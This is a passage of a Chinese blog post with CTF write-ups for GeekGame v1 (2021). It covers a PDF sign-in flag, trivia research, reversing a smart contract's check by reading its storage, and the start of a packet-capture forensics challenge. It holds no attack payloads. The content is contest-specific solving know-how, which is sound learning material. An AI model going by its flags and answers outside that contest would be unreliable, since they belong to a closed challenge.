<!DOCTYPE html>
<html lang="zh">

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  
  
  <title>taoky&#39;s GeekGame v1 (2021) writeups</title>
  <meta name="description" content="作为隔壁 Hackergame 的 staff 前来围观。因为自己基本不会 binary，数学也不会，所以主要完成的是 misc 和 web 这两个分类的题目。">
  

  <link rel="stylesheet" href="/assets/main.css">
  <link rel="canonical" href="https://blog.taoky.moe/2021-11-21/geekgame-v1-wp.html">
  
  
  <link rel="alternate" type="application/rss+xml" title="taoky&#39;s blog" href="https://blog.taoky.moe/feed.xml">

  <link rel="stylesheet" href="/assets/typo.css">
<link rel="stylesheet" href="/assets/fonts.css">
<link rel="stylesheet" href="/assets/dark.css">

  <link href="/assets/fonts/bitter.css" rel="stylesheet">
  
  
  
    <!-- Google Analytics -->
    <script>
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

      ga('create', 'UA-44647340-1', 'auto');
      ga('send', 'pageview');
    </script>
  


</head>


  <body>

    <header class="site-header">

  <div class="wrapper">

    <a class="site-title" href="/">taoky&#39;s blog</a>

    <nav class="site-nav">
      <input type="checkbox" id="nav-trigger" class="nav-trigger" />
      <label for="nav-trigger">
        <span class="menu-icon">
          <svg viewBox="0 0 18 15" width="18px" height="15px">
            <path
              d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z" />
          </svg>
        </span>
      </label>
      <div class="trigger">
        
        
        <a class="page-link" href="/about/">About</a>
        
        
        <a class="page-link" href="/archives/">Archives</a>
        
        
        <a class="page-link" href="/projects/">Projects</a>
        
        
        <a class="page-link" href="/TAsterisk">TA*</a>
        
        
        <a class="page-link" href="https://github.com/taoky">GitHub</a>
        
      </div>
    </nav>

  </div>

</header>

    <main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post typo" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    
      <h1 class="post-title" itemprop="name headline">taoky&#39;s GeekGame v1 (2021) writeups</h1>
    
    <p class="post-meta"><time datetime="2021-11-21T14:00:00+00:00" itemprop="datePublished">Nov 21, 2021</time> •
  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
        <a href="/categories/tech/">tech</a>
      
    
      
    
  


 •
  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
        <a href="/tags/pku/">pku</a>,
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
        <a href="/tags/ctf/">ctf</a>,
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
        <a href="/tags/writeup/">writeup</a>,
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
        <a href="/tags/geekgame/">geekgame</a>
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
  

</p>
  </header>

  
  <div class="user-toc">
    <h3>TOC | 目录</h3>
    <ul id="toc" class="section-nav">
<li class="toc-entry toc-h2"><a href="#签到">→签到←</a></li>
<li class="toc-entry toc-h2"><a href="#小北问答-remake">小北问答 Remake</a></li>
<li class="toc-entry toc-h2"><a href="#共享的机器">共享的机器</a></li>
<li class="toc-entry toc-h2"><a href="#翻车的谜语人">翻车的谜语人</a>
<ul>
<li class="toc-entry toc-h3"><a href="#flag-1">Flag 1</a></li>
<li class="toc-entry toc-h3"><a href="#flag-2">Flag 2</a></li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#叶子的新歌">叶子的新歌</a></li>
<li class="toc-entry toc-h2"><a href="#在线解压网站">在线解压网站</a></li>
<li class="toc-entry toc-h2"><a href="#早期人类的聊天室">早期人类的聊天室</a></li>
<li class="toc-entry toc-h2"><a href="#q小树洞的一大步">Q小树洞的一大步</a></li>
<li class="toc-entry toc-h2"><a href="#flag即服务">flag即服务</a>
<ul>
<li class="toc-entry toc-h3"><a href="#零获得代码">零·获得代码</a></li>
<li class="toc-entry toc-h3"><a href="#壹开通会员">壹·开通会员</a></li>
<li class="toc-entry toc-h3"><a href="#贰为所欲为未完成">贰·为所欲为（未完成）</a></li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#诡异的网关">诡异的网关</a></li>
<li class="toc-entry toc-h2"><a href="#最强大脑">最强大脑</a></li>
<li class="toc-entry toc-h2"><a href="#电子游戏概论">电子游戏概论</a></li>
<li class="toc-entry toc-h2"><a href="#密码学实践">密码学实践</a></li>
<li class="toc-entry toc-h2"><a href="#扫雷">扫雷</a></li>
<li class="toc-entry toc-h2"><a href="#总结">总结</a></li>
<li class="toc-entry toc-h2"><a href="#花絮copilot-迷惑行为">花絮：Copilot 迷惑行为</a></li>
</ul>
  </div>
  

  <div class="post-content" itemprop="articleBody">
    <p>作为隔壁 Hackergame 的 staff 前来围观。因为自己基本不会 binary，数学也不会，所以主要完成的是 misc 和 web 这两个分类的题目。</p>

<p>我的用户名是「taoky # 好吃就是高兴」（与 hackergame staff 名单里我的昵称呼应，本来以为用户名有 tag 支持的，但是发现没有，也懒得改名字了），最后总榜第 6 名。</p>

<p>Update 1: 出题人与选手 writeups 官方汇总: <a href="https://github.com/PKU-GeekGame/geekgame-1st/tree/master/writeups">https://github.com/PKU-GeekGame/geekgame-1st/tree/master/writeups</a></p>

<!--more-->

<p class="center"><img src="/pictures/geekgame-wp/extra/atri.png" alt="ATRI" /></p>

<p class="center"><em>图 1. 为什么要起这个昵称？因为好吃就是高兴！</em></p>

<p>让我们开始吧。</p>

<style>
    .you-name {
        background: linear-gradient(0deg, #26791c, #1d1d1d, #1d1d1d);
        text-shadow: 0 0 1px rgba(21, 66, 14, 0.4);

        -webkit-text-fill-color: transparent;

        background-clip: text;
        -webkit-background-clip: text;

        box-decoration-break: clone;
        -webkit-box-decoration-break: clone;
    }
</style>

<h2 id="签到">→签到←</h2>

<p>比 hackergame 的签到题难。我一开始打开之后没有复制出有意义的信息，简单搜索之后发现可以用 ghostscript 来处理：</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gs <span class="nt">-sDEVICE</span><span class="o">=</span>txtwrite <span class="nt">-o</span> - sign_in.pdf
GPL Ghostscript 9.55.0 <span class="o">(</span>2021-09-27<span class="o">)</span>
Copyright <span class="o">(</span>C<span class="o">)</span> 2021 Artifex Software, Inc.  All rights reserved.
This software is supplied under the GNU AGPLv3 and comes with NO WARRANTY:
see the file COPYING <span class="k">for </span>details.
Processing pages 1 through 1.
Page 1
  fa<span class="o">{</span>aeAGetTm@ekaev!
  lgHv__ra_ieGeGm_1<span class="o">}</span>
<span class="nv">$ </span><span class="c"># flag is flag{Have_A_Great_Time@GeekGame_v1!}</span>
</code></pre></div></div>

<p>ghostscript 是一个 PDF 格式的解释器。我最喜欢的功能是用它来本地压缩特别大的 PDF：</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gs <span class="nt">-sDEVICE</span><span class="o">=</span>pdfwrite <span class="nt">-dCompatibilityLevel</span><span class="o">=</span>1.6 <span class="nt">-dPDFSETTINGS</span><span class="o">=</span>/ebook <span class="nt">-dNOPAUSE</span> <span class="nt">-dQUIET</span> <span class="nt">-dBATCH</span> <span class="nt">-sOutputFile</span><span class="o">=</span>compressed.pdf input.pdf
</code></pre></div></div>

<p>真的很方便，再也不用把（可能包含隐私信息的）PDF 传到不信任的网站来压缩了。</p>

<h2 id="小北问答-remake">小北问答 Remake</h2>

<p><em>（第二阶段完成 flag2）</em></p>

<p>隔壁的猫咪问答是允许合理爆破部分问题的答案的，但是这里显然是不行的 :-(</p>

<p>来看一下每道题目</p>

<ol>
  <li>
    <p>北京大学燕园校区有理科 1 号楼到理科 X 号楼，但没有理科 (X+1) 号及之后的楼。X 是？</p>

    <p>找个地图软件搜搜，可以搜到燕园校区理科 5 号楼，但是搜不到 6 号楼，所以答案是 5。</p>
  </li>
  <li>
    <p>上一届（第零届）比赛的总注册人数有多少？</p>

    <p>搜到 <a href="https://news.pku.edu.cn/xwzh/203d197d93c245a1aec23626bb43d464.htm">https://news.pku.edu.cn/xwzh/203d197d93c245a1aec23626bb43d464.htm</a>，得到 407。</p>
  </li>
  <li>
    <p>geekgame.pku.edu.cn 的 HTTPS 证书曾有一次忘记续期了，发生过期的时间是？</p>

    <p>哪里可以找到网站证书的历史记录呢？搜索之后可以发现可以通过证书透明度 (Certificate Transparency) 查看证书的过期时间。</p>

    <p>Google 有一个网站可以看，但是<strong>看不到精确到秒的过期时间</strong>。所以我最后选择的网站是 <a href="https://crt.sh/">https://crt.sh/</a>。<a href="https://crt.sh/?q=geekgame.pku.edu.cn">https://crt.sh/?q=geekgame.pku.edu.cn</a> 可以看到 7 月份出现了一个没有证书的空档，检查看到空档前一个证书是 <code class="language-plaintext highlighter-rouge">Not After : Jul 11 00:49:53 2021 GMT</code>，所以答案是：</p>

    <p><code class="language-plaintext highlighter-rouge">2021-07-11T08:49:53+08:00</code> <del><code class="language-plaintext highlighter-rouge">2021-07-10T16:49:53+08:00</code></del></p>

    <p>注意时区转换的时候别脑子一抽弄成了 UTC -8（因为我就搞错了）。</p>

    <p>Update 1: Google Transparency Report 虽然不显示精确的过期时间，但是实际上请求接口的返回里有过期时间的 Unix timestamp。</p>
  </li>
  <li>
    <p>2020 年 DEFCON CTF 资格赛签到题的 flag 是？</p>

    <p>资格赛是 “Quals”，搜索 “2020 DEFCON CTF Quals writeups”，我看到的第一个结果是 <a href="https://ctftime.org/writeup/20650">https://ctftime.org/writeup/20650</a>，可以得知第一道题目的名字是 welcome-to-dc2020-quals（但是因为题目真的太简单了，wp 的作者懒得写 flag），再搜索可以找到 ooo 的 archive <a href="https://archive.ooo/c/welcome-to-dc2020-quals/358/">https://archive.ooo/c/welcome-to-dc2020-quals/358/</a>，可以得知 flag 是 <code class="language-plaintext highlighter-rouge">OOO{this_is_the_welcome_flag}</code>。</p>
  </li>
  <li>
    <p>在大小为 672328094 * 386900246 的方形棋盘上放 3 枚（相同的）皇后且它们互不攻击，有几种方法？</p>

    <p>一开始没做出来，感觉是容斥原理，但是试了试，情况很复杂，真的不想算。看到第二阶段提示之后，显然对应的网站是 <a href="https://oeis.org/">OEIS</a>，尝试了一下，发现在搜索 <code class="language-plaintext highlighter-rouge">3 queen m X n board</code> 的时候，在数列 A047659 (“Number of ways to place 3 nonattacking queens on an n X n board.”) 的公式信息里可以找到：</p>

    <blockquote>
      <p>In general, for m &lt;= n, n &gt;= 3, the number of ways to place 3 nonattacking queens on an m X n board is n^3/6*(m^3 - 3*m^2 + 2*m) - n^2/2*(3*m^3 - 9*m^2 + 6*m) + n/6*(2*m^4 + 20*m^3 - 77*m^2 + 58*m) - 1/24*(39*m^4 - 82*m^3 - 36*m^2 + 88*m) + 1/16*(2*m - 4*n + 1)*(1 + (-1)^(m+1)) + 1/2*(1 + abs(n - 2*m + 3) - abs(n - 2*m + 4))*(1/24*((n - 2*m + 11)^4 - 42*(n - 2*m + 11)^3 + 656*(n - 2*m + 11)^2 - 4518*(n - 2*m + 11) + 11583) - 1/16*(4*m - 2*n - 1)*(1 + (-1)^(n+1))) [Panos Louridas, idee &amp; form 93/2007, pp. 2936-2938]. - Vaclav Kotesovec, Feb 20 2016</p>
    </blockquote>

    <p>就算知道提示，我也在 OEIS 上找了好几个小时才看到答案。另外，<a href="https://space.bilibili.com/672328094/">672328094</a> * <a href="https://space.bilibili.com/386900246/">386900246</a>，好家伙。</p>
  </li>
  <li>
    <p>上一届（第零届）比赛的“小北问答1202”题目会把所有选手提交的答案存到 SQLite 数据库的一个表中，这个表名叫？</p>

    <p>翻上一届比赛在 GitHub 上的记录，看到 <a href="https://github.com/PKU-GeekGame/geekgame-0th/blob/main/src/choice/game/db.py#L12">https://github.com/PKU-GeekGame/geekgame-0th/blob/main/src/choice/game/db.py#L12</a>，得到答案为 <code class="language-plaintext highlighter-rouge">submits</code>。</p>
  </li>
  <li>
    <p>国际互联网由许多个自治系统（AS）组成。北京大学有一个自己的自治系统，它的编号是？</p>

    <p>说到 AS，那肯定去 <a href="https://bgp.he.net/">https://bgp.he.net/</a> 看，搜索 “Peking University”，得到答案 AS59201。另一个 CERNET2 的不算「自己的」AS。</p>
  </li>
  <li>
    <p>截止到 2021 年 6 月 1 日，完全由北京大学信息科学技术学院下属的中文名称最长的实验室叫？</p>

    <p>一开始看信息科学技术学院官网，以为是 射频与太赫兹集成技术研究中心，输进去发现长度完全不够，去下属实验室官网翻了翻，感觉 区域光纤通信网与新型光通信系统国家重点实验室 这个名字最长，那就是它了！</p>
  </li>
</ol>

<h2 id="共享的机器">共享的机器</h2>

<p>这是我自己完成的第一道区块链题（为了做题，特地去装了个 MetaMask）。去 Etherscan 看合约字节码，点 Decompile 可以看大致的逻辑。其中主要做计算的是第二个函数:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">unknownded0677d</span><span class="p">(</span><span class="n">uint256</span> <span class="n">_param1</span><span class="p">)</span> <span class="n">payable</span><span class="p">:</span> 
  <span class="n">require</span> <span class="n">calldata</span><span class="p">.</span><span class="n">size</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">&gt;=</span> <span class="mi">32</span>
  <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span>
  <span class="n">s</span> <span class="o">=</span> <span class="mi">0</span>
  <span class="k">while</span> <span class="n">idx</span> <span class="o">&lt;</span> <span class="mi">64</span><span class="p">:</span>
      <span class="n">idx</span> <span class="o">=</span> <span class="n">idx</span> <span class="o">+</span> <span class="mi">1</span>
      <span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="ow">or</span> <span class="p">(</span><span class="n">Mask</span><span class="p">(</span><span class="mi">256</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span> <span class="o">*</span> <span class="n">idx</span><span class="p">,</span> <span class="n">_param1</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">idx</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="mi">5</span> <span class="o">*</span> <span class="n">idx</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="mi">7</span> <span class="o">*</span> <span class="n">Mask</span><span class="p">(</span><span class="mi">256</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span> <span class="o">*</span> <span class="n">idx</span><span class="p">,</span> <span class="n">stor2</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">idx</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">idx</span>
      <span class="k">continue</span> 
  <span class="k">if</span> <span class="n">stor3</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
      <span class="n">revert</span> <span class="k">with</span> <span class="mi">0</span><span class="p">,</span> <span class="s">'this is not the real flag!'</span>
  <span class="k">return</span> <span class="mi">1</span>
</code></pre></div></div>

<p>不过我自己感觉这个解析不太清楚，所以也使用 ethervm.io 试了试，对应的关键代码如下：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">label_02C9:</span>
    <span class="n">var</span> <span class="n">temp5</span> <span class="o">=</span> <span class="n">var1</span><span class="p">;</span>
    <span class="n">var0</span> <span class="o">=</span> <span class="n">var0</span> <span class="o">|</span> <span class="p">(((</span><span class="n">arg0</span> <span class="o">&gt;&gt;</span> <span class="n">temp5</span> <span class="o">*</span> <span class="mh">0x04</span><span class="p">)</span> <span class="o">+</span> <span class="n">temp5</span> <span class="o">*</span> <span class="mh">0x05</span> <span class="o">+</span> <span class="p">(</span><span class="n">storage</span><span class="p">[</span><span class="mh">0x02</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="n">temp5</span> <span class="o">*</span> <span class="mh">0x04</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x07</span> <span class="o">&amp;</span> <span class="mh">0x0f</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">temp5</span> <span class="o">*</span> <span class="mh">0x04</span><span class="p">);</span>
    <span class="n">var1</span> <span class="o">=</span> <span class="n">temp5</span> <span class="o">+</span> <span class="mh">0x01</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">var1</span> <span class="o">&gt;=</span> <span class="mh">0x40</span><span class="p">)</span> <span class="p">{</span> <span class="k">goto</span> <span class="n">label_0301</span><span class="p">;</span> <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span> <span class="k">goto</span> <span class="n">label_02C9</span><span class="p">;</span> <span class="p">}</span>
</code></pre></div></div>

<p>以及</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">label_0301:</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">var0</span> <span class="o">==</span> <span class="n">storage</span><span class="p">[</span><span class="mh">0x03</span><span class="p">])</span> <span class="p">{</span> <span class="k">return</span> <span class="mh">0x01</span><span class="p">;</span> <span class="p">}</span>
</code></pre></div></div>

<p>把我卡住最长时间的问题是：storage 是啥？最后读了 <a href="https://paper.seebug.org/640/">https://paper.seebug.org/640/</a>，发现可以在 remix IDE 里处理：把 MetaMask 切换到测试链，与 remix 连接，然后：</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="dl">"</span><span class="s2">0xa43028c702c3B119C749306461582bF647Fd770a</span><span class="dl">"</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
<span class="mh">0x293edea661635aabcd6deba615ab813a7610c1cfb9efb31ccc5224c0e4b37372</span>
<span class="o">&gt;</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="dl">"</span><span class="s2">0xa43028c702c3B119C749306461582bF647Fd770a</span><span class="dl">"</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
<span class="mh">0x15eea4b2551f0c96d02a5d62f84cac8112690d68c47b16814e221b8a37d6c4d3</span>
<span class="o">&gt;</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="dl">"</span><span class="s2">0xa43028c702c3B119C749306461582bF647Fd770a</span><span class="dl">"</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="mh">0xda69868cde27bd8f3258098cceb1d09d73d5c8501756ee3b5cb2e7782ad74d98</span>
<span class="o">&gt;</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="dl">"</span><span class="s2">0xa43028c702c3B119C749306461582bF647Fd770a</span><span class="dl">"</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="mh">0x000000000000000000000000004d5200a3571391f3e654df156271bf2f01c0c5</span>
</code></pre></div></div>

<p>我们就得到了 <code class="language-plaintext highlighter-rouge">storage[2]</code> 和 <code class="language-plaintext highlighter-rouge">storage[3]</code> 的值。看逻辑的话可以知道是一个一个 hex 算的，所以可以推出输入的值。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s02</span> <span class="o">=</span> <span class="s">"15eea4b2551f0c96d02a5d62f84cac8112690d68c47b16814e221b8a37d6c4d3"</span>

<span class="n">res</span> <span class="o">=</span> <span class="s">"293edea661635aabcd6deba615ab813a7610c1cfb9efb31ccc5224c0e4b37372"</span>

<span class="n">out</span> <span class="o">=</span> <span class="s">""</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">s02</span><span class="p">)):</span>
    <span class="c1"># var0 = var0 | (((arg0 &gt;&gt; idx * 0x04) + idx * 0x05 + (s02 &gt;&gt; idx * 0x04) * 0x07 &amp; 0x0f) &lt;&lt; idx * 0x04)
</span>    <span class="n">resi</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">res</span><span class="p">[:</span><span class="nb">len</span><span class="p">(</span><span class="n">s02</span><span class="p">)</span><span class="o">-</span><span class="n">i</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
    <span class="n">s02i</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">s02</span><span class="p">[:</span><span class="nb">len</span><span class="p">(</span><span class="n">s02</span><span class="p">)</span><span class="o">-</span><span class="n">i</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
    <span class="n">value</span> <span class="o">=</span> <span class="p">(</span><span class="n">resi</span> <span class="o">-</span> <span class="p">((</span><span class="n">s02i</span> <span class="o">*</span> <span class="mi">7</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">)</span> <span class="o">-</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">5</span><span class="p">)</span> <span class="o">&amp;</span><span class="mh">0xf</span>
    <span class="c1"># print(resi, s02i, hex(value))
</span>    <span class="n">out</span> <span class="o">+=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">value</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span>

<span class="k">print</span><span class="p">(</span><span class="n">out</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
</code></pre></div></div>

<p>得到 hex 值，找个 hex editor 就能看 flag 了。</p>

<h2 id="翻车的谜语人">翻车的谜语人</h2>

<p><em>（Flag 2 &amp; 整道题目总榜一血）</em></p>

<h3 id="flag-1">Flag 1</h3>

<p><del>境 外 服 务 器（指 kali vm）</del></p>

<p>拿到流量包，Wireshark 看了一下有明文 HTTP 流量，所以直接导出 HTTP objects（File -&gt; Export Objects -&gt; HTTP）。把导出的文件翻一遍，可以看到这样的脚本（整理后）：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">zwsp_steg</span>
<span class="kn">from</span> <span class="nn">Crypto.Random</span> <span class="kn">import</span> <span class="n">get_random_bytes</span>

<span class="kn">import</span> <span class="nn">binascii</span>

<span class="k">def</span> <span class="nf">genflag</span><span class="p">():</span>
    <span class="k">return</span> <span class="s">'flag{%s}'</span><span class="o">%</span><span class="n">binascii</span><span class="p">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">get_random_bytes</span><span class="p">(</span><span class="mi">16</span><span class="p">)).</span><span class="n">decode</span><span class="p">()</span>

<span class="n">flag1</span> <span class="o">=</span> <span class="n">genflag</span><span class="p">()</span>
<span class="n">flag2</span> <span class="o">=</span> <span class="n">genflag</span><span class="p">()</span>

<span class="n">key</span> <span class="o">=</span> <span class="n">get_random_bytes</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">flag1</span><span class="p">))</span>
<span class="c1"># b'\\xc4\\x07[\\xe5zy}b3\\x1aM\\xed\\t\\x14\\x1c\\xea\\x8f\\xfb\\xe52\\\\\\x80\\xb1\\x98\\x8a\\xb4\\xa6\\xdd;\\x92X\\x81\\xcd\\x86\\x86\\xc4\\xe0v'
</span>
<span class="k">def</span> <span class="nf">xor_each</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
    <span class="n">out</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">)):</span>
        <span class="n">out</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">k</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>

<span class="n">encoded_flag1</span> <span class="o">=</span> <span class="n">xor_each</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">flag1</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
<span class="n">encoded_flag2</span> <span class="o">=</span> <span class="n">xor_each</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">flag2</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'flag2.txt'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">binascii</span><span class="p">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">encoded_flag2</span><span class="p">))</span>
</code></pre></div></div>

<p>flag1 看起来也是相似的，只是 key 变成了 <code class="language-plaintext highlighter-rouge"># b'\\x1e\\xe0[u\\xf2\\xf2\\x81\\x01U_\\x9d!yc\\x8e\\xce[X\\r\\x04\\x94\\xbc9\\x1d\\xd7\\xf8\\xde\\xdcd\\xb2Q\\xa3\\x8a?\\x16\\xe5\\x8a9'</code>。</p>

<p>flag1.txt 的内容可以从另一个文件得到：</p>

